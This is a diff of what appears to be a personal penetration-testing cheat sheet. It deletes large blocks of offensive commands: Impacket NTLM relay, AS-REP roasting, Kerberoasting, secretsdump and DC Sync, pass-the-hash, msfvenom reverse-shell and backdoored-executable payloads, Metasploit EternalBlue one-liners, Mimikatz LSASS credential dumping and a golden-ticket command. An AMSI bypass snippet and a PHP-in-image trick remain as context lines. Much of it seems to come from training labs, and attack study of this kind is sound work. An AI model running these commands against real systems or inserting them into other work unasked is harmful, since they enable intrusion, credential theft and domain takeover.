@@ -56,95 +56,6 @@ evil-winrm -i x.x.x.x -u someuser -p spazzword -P 5985
 evil-winrm -i x.x.x.x -u vagrant -H xxxxxxxxxxxxxHASHxxxxxxxxxxxxxxx 
 ```
 
-// Impacket - Docker install
-```
-git clone https://github.com/fortra/impacket.git
-cd impacket
-docker build -t "impacket:latest" .
-```
-
-// Impacket - Run docker container with binded share folder from local desktop
-```  
-docker run -it --rm -v ~/Desktop/share:/shared impacket:latest
-```
-
-// Impacket - Enumerate SIDs
-```
-impacket-lookupsid anonymous@10.10.10.10
-```
-// Impacket - NTLM relay
-```
-impacket-ntlmrelayx -smb2support -t smb://10.10.10.10 -c 'whoami /all' -debug
-```
-
-// Impacket - ASREProast
-```
-impacket-GetNPUsers contoso.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.10
-```
-
-// Impacket - Create share  (not MacOS)
-```  
-smbserver.py -smb2support -username <user> -password <password> <share name> <path to share>
-```
-
-// Impacket/Linux - Set perms on shared files
-```  
-chmod +r ~/Desktop/share/sam.hive
-chmod +r ~/Desktop/share/system.hive   
-```  
-
-// Impacket - Secrets Dump
-```  
-secretsdump.py -sam sam.hive -system system.hive LOCAL
-```  
-
-// Impacket - Pass the hash  
-```  
-psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8f81ee5558e2d1205a8
-4d07b0e3b34f5::: administrator@x.x.x.x
-```  
-
-// Impacket - extract hashes from ntds files
-```
-secretsdump.py -security ~/SECURITY -system ~/SYSTEM -ntds ~/ntds.dit local
-```
-// Impacket - DC Sync attack just NTDS data
-```
-secretsdump.py -just-dc THM.red/<AD_Admin_User>@x.x.x.x
-```
-
-// Impacket - DC Sync Just NTLM data
-```
-secretsdump.py -just-dc-ntlm THM.red/<AD_Admin_User>@x.x.x.x
-```
-
-// Impacket - Enumerate SPN users
-```
-GetUserSPNs.py -dc-ip 10.10.117.9 THM.red/thm
-Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra
-
-Password:
-ServicePrincipalName          Name     MemberOf  PasswordLastSet             LastLogon  Delegation 
-----------------------------  -------  --------  --------------------------  ---------  ----------
-http/creds-harvestin.thm.red  svc-thm            2022-06-10 10:47:33.796826  <never> 
-```
-
-// Impacket - Request TGS Ticket as SPN account
-```
-GetUserSPNs.py -dc-ip 10.10.117.9 THM.red/thm -request-user svc-thm
-Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra
-
-Password:
-ServicePrincipalName          Name     MemberOf  PasswordLastSet             LastLogon  Delegation 
-----------------------------  -------  --------  --------------------------  ---------  ----------
-http/creds-harvestin.thm.red  svc-thm            2022-06-10 10:47:33.796826  <never>               
-
-
-
-[-] CCache file is not found. Skipping...
-$krb5tgs$23$*svc-thm$THM.RED$THM.red/svc-thm*$...
-
-```
 // AMSI bypass - https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/  
 ```
 $w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils'
@@ -170,20 +81,6 @@ creates 3 files
 - C:\Windows\System32\config\SECURITY
 ```
 
-// Payloads with msfvenom - Linux
-```
-msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o shellcode.bin  
-msfvenom -p php/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -f raw -o evil.php
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -f exe -o payload.exe  
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=x.x.x.x LPORT=4444 -f msi -o rev-shell.msi
-msfvenom -p windows/exec CMD='net user <username> <password> /add && net localgroup administrators bilbo /add' -f exe -o adduser.exe
-msfvenom -p windows/exec CMD='powershell -Command "net user <username> <password> /add; net localgroup administrators <username> /add"' -f exe -o adduser.exe
-msfvenom -p windows/exec CMD='net localgroup administrators <username> /add' -f msi -o adduser.msi
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=x.x.x.x LPORT=4444 -f exe-service -o evil-service.exe
-msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/meterpreter/reverse_tcp lhost=x.x.x.x lport=4444 -i 3 -b "\x00" -f exe -o puttyX.exe
-msfvenom -l encoders
-```
-  
 // PHP payload with Exiftool - Linux  
 
     exiftool -Comment='<?php phpinfo(); ?>' ./street-cat.jpg  
@@ -194,80 +91,6 @@ msfvenom -l encoders
 exiftool -All= image.jpg
 ```
      
-// Metasploit - Linux  
- 
-     msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue;setg RHOSTS $IP;setg LHOST tun0;run"  
-     msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue;set payload windows/x64/shell/reverse_tcp;setg RHOSTS $IP;setg LHOST tun0;run"  
-     msfconsole -q -x "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set LHOST x.x.x.x;set LPORT 4445;run"
-     msfconsole -q -x "use exploit/windows/local/always_install_elevated;set lhost x.x.x.x;set session 1;run
-     sessions -u 1  
-     sessions -i 5  
-     background  
-     search shell_to_meterpreter  
-     search php/meterpreter/reverse_tcp  
-
-// Kiwi - initialization from Meterpreter
-```  
-getsystem
-load kiwi
-meterpreter > lsa_dump_sam
-```
-
-// Kiwi - kiwi_cmd  
-```
-kiwi_cmd "sekurlsa::logonPasswords full"
-```
-
-// Mimikatz  
-```
-PS C:\tools\Mimikatz> .\mimikatz.exe
-
-  .#####.   mimikatz 2.2.0 (x64) #19041 May 19 2020 00:48:59
- .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
- ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
- ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
- '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
-  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
-
-mimikatz # privilege::debug
-Privilege '20' OK
-
-mimikatz # sekurlsa::logonpasswords
-ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
-
-mimikatz # !+
-[*] 'mimidrv' service not present
-[+] 'mimidrv' service successfully registered
-[+] 'mimidrv' service ACL to everyone
-[+] 'mimidrv' service started
-
-mimikatz # sekurlsa::logonpasswords
-ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
-
-mimikatz # !processprotect /process:lsass.exe /remove
-Process : lsass.exe
-PID 828 -> 00/00 [0-0-0]
-
-mimikatz # sekurlsa::logonpasswords
-...
-mimikatz # sekurlsa::credman
-...
-```
-
-// Kerberoasting
-```powershell  
-kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf /id:500 
-```  
-
-// Performing an AS-REP Roasting Attack against Users List
-```
-GetNPUsers.py -dc-ip 10.10.117.9 thm.red/ -usersfile /tmp/users.txt
-Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra
-
-$krb5asrep$23$victim@THM.RED:...
-
-```
-
 // Hashcat - Crack NTLM hash
 ```
 hashcat -m 1000 -a 0 /path/to/ntlm_hashes.txt
@@ -465,10 +288,6 @@ Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName lo
 
     md5 filename
     shasum -a 256 filename
-
-// Right-Click context menu - Windows 11  
- 
-     reg add "HKCU\Software\Classes\CLSID\{86ca1aa0-34aa-4e8b-a509-50c905bae2a2}\InprocServer32" /f /ve
     
 // Unzip a disc image - Linux
  
@@ -655,7 +474,6 @@ Web Portal
 // Tshark filters  
 
     tshark -r dnsexfil.pcap -Y "!(ip.src == 192.168.1.200) && !(tcp.analysis.retransmission || tcp.analysis.flags && tcp.flags.reset)" -T fields -e dns.qry.name  
-
     tshark -r dnsexfil.pcap -Y "dns.qry.type == 1" -T fields -e dns.qry.name  
 
     tshark -r dnsexfil.pcap -Y "dns" -T fields -e dns.id  
